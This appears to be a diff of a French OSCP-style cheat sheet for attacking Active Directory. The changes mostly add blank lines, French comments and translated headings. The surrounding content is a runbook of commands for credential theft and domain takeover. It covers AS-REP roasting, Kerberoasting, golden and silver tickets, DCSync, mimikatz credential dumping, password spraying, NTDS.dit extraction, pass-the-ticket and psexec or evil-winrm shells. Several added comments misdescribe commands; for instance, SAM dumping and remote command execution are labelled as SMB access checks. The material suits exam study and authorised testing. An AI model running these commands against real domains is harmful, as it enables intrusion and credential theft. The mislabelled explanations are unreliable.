@@ -15,6 +15,7 @@ description: "Étudier les mécanismes d'authentification et les techniques AD."
 
 ```bash
 John the Ripper
+
 ```
 
 
@@ -22,6 +23,7 @@ John the Ripper
 
 ```powershell
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth
+
 ```
 
 
@@ -32,6 +34,7 @@ Rubeus.exe asreproast
 
 # L'option /nowrap empêche la sortie d'être enveloppée à la ligne suivante, vous permettant de voir la totalité de la sortie sur une seule ligne sans interruption
 Rubeus.exe asreproast /nowrap
+
 ```
 
 
@@ -43,6 +46,7 @@ impacket-GetNPUsers -dc-ip [dc-ip] -request -outputfile [output_file].asreproast
 
 # Depuis Windows
 GetNPUsers.py domain/[user]:[password]@[dc-ip] -no-pass
+
 ```
 
 
@@ -50,6 +54,7 @@ GetNPUsers.py domain/[user]:[password]@[dc-ip] -no-pass
 
 ```bash
 hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt
+
 ```
 
 
@@ -60,6 +65,7 @@ hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt
 
 ```powershell
 GetUserSPNs.py domain/[user]:[password]@[dc-ip]
+
 ```
 
 
@@ -73,6 +79,7 @@ sudo impacket-GetUserSPNs -request -dc-ip [dc_ip] [domain.com]/[user] -hashes [L
 
 # Depuis Windows
 GetUserSPNs.py domain/[user]:[password]@[dc-ip] -request
+
 ```
 
 
@@ -82,6 +89,7 @@ GetUserSPNs.py domain/[user]:[password]@[dc-ip] -request
 Rubeus.exe kerberoast
 # Autre possibilité
 Rubeus.exe kerberoast /outfile:[output_file].kerberoast
+
 ```
 
 
@@ -89,6 +97,7 @@ Rubeus.exe kerberoast /outfile:[output_file].kerberoast
 
 ```bash
 hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt
+
 ```
 
 
@@ -108,6 +117,7 @@ mimikatz # lsadump::lsa /inject /name:[ServiceAccountName]
 
 # Exemple :
 mimikatz # lsadump::dcsync /user:HTTP/server01
+
 ```
 
 
@@ -129,6 +139,7 @@ mimikatz # kerberos::golden /domain:[domain.com] /sid:[domainSID] /target:[targe
 
 # Exemple :
 mimikatz # kerberos::golden /sid:S-1-5-21-1863423273-656352785-1243762498 /domain:example.com /ptt /target:server01.example.com /service:http /rc4:4d28cf5252d39971462580a51484ca09 /user:testUser
+
 ```
 
 
@@ -139,6 +150,7 @@ mimikatz # kerberos::ptt silver_ticket.kirbi
 
 # Confirmer l'existence du ticket
 klist
+
 ```
 
 
@@ -146,6 +158,7 @@ klist
 
 ```bash
 dir \\targetserver\sharedfolder
+
 ```
 
 
@@ -160,6 +173,7 @@ dir \\targetserver\sharedfolder
 
 ```powershell
 mimikatz # lsadump::dcsync /domain:[domain.com] /user:krbtgt
+
 ```
 
 
@@ -178,6 +192,7 @@ PowerShell -Command "(New-Object System.Security.Principal.NTAccount('domain\Ser
 mimikatz # kerberos::golden /user:[DesiredUsername] /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:[DesiredRID]
 # Autre possibilité
 mimikatz # kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:500
+
 ```
 
 
@@ -188,6 +203,7 @@ mimikatz # kerberos::ptt golden_ticket.kirbi
 
 # Confirmer l'existence du ticket
 klist
+
 ```
 
 
@@ -195,6 +211,7 @@ klist
 
 ```bash
 net use \\domaincontroller\C$ /user:[DesiredUsername]
+
 ```
 
 
@@ -207,6 +224,7 @@ Examiner les objets, les droits et les services du domaine.
 
 ```powershell
 Get-ADGroupMember -Identity "Domain Admins"
+
 ```
 
 
@@ -222,6 +240,7 @@ impacket-secretsdump -just-dc-user [targetUser] [domain.com]/[adminUser]:"[passw
 mimikatz # lsadump::dcsync /domain:[domain.com]
 # ou ; ici nous extrayons simplement l'utilisateur spécifié.
 mimikatz # lsadump::dcsync /domain:[domain.com] /user:[targetUser]
+
 ```
 
 
@@ -229,12 +248,14 @@ mimikatz # lsadump::dcsync /domain:[domain.com] /user:[targetUser]
 
 ```powershell
 mimikatz # lsadump::dcsync /domain:[domain.com]
+
 ```
 
 
 ```powershell
 # Vous pouvez rediriger la sortie vers un fichier pour analyse :
 mimikatz # lsadump::dcsync /domain:domain.com > output.txt
+
 ```
 
 
@@ -242,6 +263,7 @@ mimikatz # lsadump::dcsync /domain:domain.com > output.txt
 
 ```bash
 hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt
+
 ```
 
 
@@ -272,6 +294,7 @@ mimikatz # lsadump::secrets
 mimikatz # lsadump::lsa /inject
 mimikatz # lsadump::trust
 mimikatz # lsadump::cache
+
 ```
 
 
@@ -279,6 +302,7 @@ mimikatz # lsadump::cache
 
 ```bash
 hashcat -m 1000 [cached_hash].txt /usr/share/wordlists/rockyou.txt
+
 ```
 
 
@@ -291,11 +315,13 @@ hashcat -m 1000 [cached_hash].txt /usr/share/wordlists/rockyou.txt
 
 ```powershell
 mimikatz # sekurlsa::logonpasswords
+
 ```
 
 
 ```powershell
 mimikatz # sekurlsa::pth /user:[username] /domain:[domain.com] /ntlm:[NTLMhash]
+
 ```
 
 
@@ -303,6 +329,7 @@ mimikatz # sekurlsa::pth /user:[username] /domain:[domain.com] /ntlm:[NTLMhash]
 
 ```bash
 dir \\targetserver\sharedfolder
+
 ```
 
 
@@ -317,11 +344,13 @@ Examiner les objets, les droits et les services du domaine.
 
 ```powershell
 mimikatz # sekurlsa::tickets /export
+
 ```
 
 
 ```powershell
 mimikatz # kerberos::ptt TGT_ticket.kirbi
+
 ```
 
 
@@ -329,6 +358,7 @@ mimikatz # kerberos::ptt TGT_ticket.kirbi
 
 ```bash
 dir \\targetserver\sharedfolder
+
 ```
 
 
@@ -342,6 +372,7 @@ dir \\targetserver\sharedfolder
 # Nous pourrions également ajouter l'option -File pour utiliser une liste de mots de passe personnalisée.
 # -Admin option est pour ajouter un test pour compte admin.
 .\Spray-Passwords.ps1 -Pass [password] -Admin
+
 ```
 
 
@@ -763,6 +794,7 @@ If ($Admins) {Write-Host "WARNING: also targeting admin accounts." -BackgroundCo
 
 # Appeler la fonction principale et démarrer la force brute
 BruteForce $duration $threshold $passwords
+
 ```
 
 
@@ -792,6 +824,7 @@ $ldapPath += $domainDN
 
 # Authentifier le service d'annuaire avec des références spécifiques
 $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath, "[userName]", "[password]")
+
 ```
 
 
@@ -806,16 +839,21 @@ crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --password-spray
 # Autre possibilité
 crackmapexec smb [ip/domain] -u [userName] -p '[password]' -d [domain.com]
+
 ```
 
 
 ```bash
+# Vérifier l'accès SMB
 crackmapexec smb [ip/domain] -u [userName] -p '[password]' -d [domain.com] --kerberos
+
 ```
 
 
 ```bash
+# Vérifier l'accès SMB
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --signing
+
 ```
 
 
@@ -826,7 +864,9 @@ crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 
 
 ```bash
+# Vérifier l'accès SMB
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --continue-on-error
+
 ```
 
 
@@ -837,121 +877,165 @@ crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --shares
+
 ```
 
 
 ```bash
+# Vérifier l'accès SMB
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --smbv1
+
 ```
 
 
 ```bash
+# Lister les sessions SMB
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --sessions
+
 ```
 
 
 ```bash
+# Vérifier l'accès SMB
 crackmapexec smb [ip/domain] -u Administrator -p '[AdminPassword]!' -d [domain.com] --sam
+
 ```
 
 
 ```bash
+# Vérifier l'accès SMB
 crackmapexec smb [ip/domain] -u [userName] -p '[password]!' -d [domain.com] --exec-command "[command]"
+
 ```
 
 
-#### Possible Services to Test
+#### Services pouvant être vérifiés
 
 
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec rdp [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
+
 ```
 
 
 ```bash
+# Vérifier l'accès WinRM
 crackmapexec winrm [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec http [ip/domain] -u [userName] -p '[password]'
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec ftp [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec telnet [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec smtp [ip/domain] -u [users_file].txt -p '[password]'
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec dns [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
+
 ```
 
 
 ```bash
+# Vérifier l'accès LDAP
 crackmapexec ldap [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec netbios [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec mysql [ip/domain] -u [users_file].txt -p '[password]'
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec postgres [ip/domain] -u [users_file].txt -p '[password]'
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec mssql [ip/domain] -u [users_file].txt -p '[password]'
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec oracle [ip/domain] -u [users_file].txt -p '[password]'
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec redis [ip/domain] -u [users_file].txt -p '[password]'
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec docker [ip/domain] -u [users_file].txt -p '[password]'
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec snmp [ip/domain] -u [users_file].txt -p '[password]'
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec ntp [ip/domain]
+
 ```
 
 
@@ -963,6 +1047,7 @@ crackmapexec ntp [ip/domain]
 ```powershell
 # L'exécutable se trouve dans le kerbrute GitHub (lien dans la section 18.3.2.2).
 .\kerbrute_windows_amd64.exe passwordspray -d [domain.com] .\[usernames_file].txt "[password]"
+
 ```
 
 
@@ -974,6 +1059,7 @@ crackmapexec ntp [ip/domain]
 ```powershell
 # -p X: this indicates which disk we wanto to copy, usually is C.
 vshadow.exe -nw -p C:
+
 ```
 
 
@@ -989,6 +1075,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit C:\
 
 # Exemple
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+
 ```
 
 
@@ -999,6 +1086,7 @@ reg.exe save hklm\system C:\backup_path\system.bak
 
 # Exemple
 C:\> reg.exe save hklm\system c:\system.bak
+
 ```
 
 
@@ -1009,6 +1097,7 @@ impacket-secretsdump -ntds [ntds_file] -system [system_file] LOCAL
 
 # Exemple
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+
 ```
 
 
@@ -1016,6 +1105,7 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 
 ```powershell
 mimikatz # lsadump::ntds /ntds:"[ntds_file]" /system:"[system_file]"
+
 ```
 
 
@@ -1023,6 +1113,7 @@ mimikatz # lsadump::ntds /ntds:"[ntds_file]" /system:"[system_file]"
 
 ```powershell
 vssadmin list shadows
+
 ```
 
 
@@ -1031,6 +1122,7 @@ vssadmin list shadows
 ```powershell
 # Remplacer X par le numéro de copie d'ombre.
 mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
+
 ```
 
 
@@ -1041,21 +1133,25 @@ mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
 
 ```powershell
 dir C:\ShadowCopy
+
 ```
 
 
-## Constrained Delegation Attack
+## Délégation contrainte Kerberos
 
 
 <p class="oscp-command-note">Énumérer les ordinateurs du domaine.</p>
 
 ```powershell
 Get-ADComputer -Filter {ServicePrincipalName -like "*"} -Property ServicePrincipalName | Select-Object Name,ServicePrincipalName
+
 ```
 
 
 ```powershell
+# Lister les comptes du domaine
 Get-ADUser -Identity <ServiceAccount> -Properties msDS-AllowedToDelegateTo
+
 ```
 
 
@@ -1063,10 +1159,11 @@ Get-ADUser -Identity <ServiceAccount> -Properties msDS-AllowedToDelegateTo
 
 ```bash
 kinit <ServiceAccount>
+
 ```
 
 
-### Key Énumération Tools
+### Outils essentiels d'énumération
 
 
 **Paramètres et repères :**
@@ -1074,7 +1171,7 @@ kinit <ServiceAccount>
 `Impacket` · `Responder` · `PowerView`  
 
 
-### Workflow for Énumération and Credential Testing
+### Méthode d'énumération et de vérification des identifiants
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -1087,6 +1184,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```bash
 nmap -p 88,135,139,389,445,5985,636,3268 -sC -sV -Pn [IP]
+
 ```
 
 
@@ -1151,6 +1249,7 @@ WinRM · Windows Remote Management.
 
 ```bash
 responder -I eth0
+
 ```
 
 
@@ -1163,6 +1262,7 @@ responder -I eth0
 ```bash
 # Same tool as impacket-secretsdump
 secretsdump.py [domain].com/[VALID_USERNAME]:[VALID_PASSWORD]@[IP]
+
 ```
 
 
@@ -1170,6 +1270,7 @@ secretsdump.py [domain].com/[VALID_USERNAME]:[VALID_PASSWORD]@[IP]
 
 ```powershell
 Get-ADUser -Filter * | Select-Object Name, SamAccountName
+
 ```
 
 
@@ -1177,6 +1278,7 @@ Get-ADUser -Filter * | Select-Object Name, SamAccountName
 
 ```text
 Find-DomainShare -Writable
+
 ```
 
 
@@ -1184,6 +1286,7 @@ Find-DomainShare -Writable
 
 ```powershell
 Get-ADGroupMember -Identity "Domain Admins"
+
 ```
 
 
@@ -1198,6 +1301,7 @@ Get-ADGroupMember -Identity "Domain Admins"
 
 ```bash
 crackmapexec smb [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --shares --rate 1
+
 ```
 
 
@@ -1205,7 +1309,7 @@ crackmapexec smb [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --shares --rate 1
 `rpcclient`  
 
 
-### Web Interfaces for Domain Énumération
+### Interfaces web d'énumération de domaine
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -1214,6 +1318,7 @@ Examiner les objets, les droits et les services du domaine.
 
 ```bash
 nmap -p 3389 --script rdp-ntlm-info [IP]
+
 ```
 
 
@@ -1221,6 +1326,7 @@ nmap -p 3389 --script rdp-ntlm-info [IP]
 
 ```bash
 crackmapexec winrm [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --exec-method invoke_command
+
 ```
 
 
@@ -1228,6 +1334,7 @@ crackmapexec winrm [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --exec-method in
 
 ```bash
 ldapsearch -x -h [IP] -p 9389
+
 ```
 
 
@@ -1242,6 +1349,7 @@ Domain SID: S-1-5-21-123456789-1234567890-123456789
 Users:
   [*] Administrator
   [*] Guest
+
 ```
 
 
@@ -1253,6 +1361,7 @@ Users:
 
 ```text
 192.168.123.10 - SMB         [*] domain.local\esolis:Password2024! (Pwned!)
+
 ```
 
 
@@ -1262,6 +1371,7 @@ Users:
 dn: CN=Emma Solis,OU=Users,DC=domain,DC=local
 sAMAccountName: esolis
 userPrincipalName: esolis@domain.local
+
 ```
 
 
@@ -1289,6 +1399,7 @@ Often sufficient, as it allows escalation to SYSTEM or LSASS access tools.
 mimikatz
 privilege::debug
 sekurlsa::tickets
+
 ```
 
 
@@ -1297,6 +1408,7 @@ sekurlsa::tickets
 ```powershell
 # Cela enregistrera les fichiers .kirbi sur le disque. Identifier le bon TGT en fonction de l'utilisateur et du type de chiffrement.
 sekurlsa::tickets /export
+
 ```
 
 
@@ -1304,6 +1416,7 @@ sekurlsa::tickets /export
 
 ```powershell
 kerberos::ptt C:\path\to\admin_ticket.kirbi
+
 ```
 
 
@@ -1326,6 +1439,7 @@ PsExec.exe \\[target_host] -u [domain]\[username] cmd.exe
 Enter-PSSession -ComputerName [target_host] -Authentication Kerberos -Credential [domain]\[username]
 
 # RDP: utilisez mstsc (Remote Desktop), si TGT est injecté correctement et que la confiance du domaine le permet, vous n'êtes pas invité pour un mot de passe.
+
 ```
 
 
@@ -1343,6 +1457,7 @@ psexec.py -k -no-pass [domain]/[username]@[target_host]
 
 # Utilisation de Evil-WinRM
 evil-winrm -k -no-pass -u [username] -d [domain] -i [target_host]
+
 ```
 
 ---
